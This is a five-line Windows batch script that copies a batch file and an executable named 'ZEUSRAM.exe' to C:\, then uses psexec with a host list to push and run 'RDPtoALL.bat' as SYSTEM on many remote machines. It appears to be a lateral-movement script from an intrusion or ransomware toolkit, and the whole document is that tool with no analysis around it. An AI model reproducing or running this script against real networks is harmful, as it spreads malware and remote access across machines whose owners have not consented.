cd %~dp0
copy RDPtoALL.bat C:\
copy ZEUSRAM.exe C:\
psexec @1.txt -d -s -h -c "C:\RDPtoALL.bat"
cmd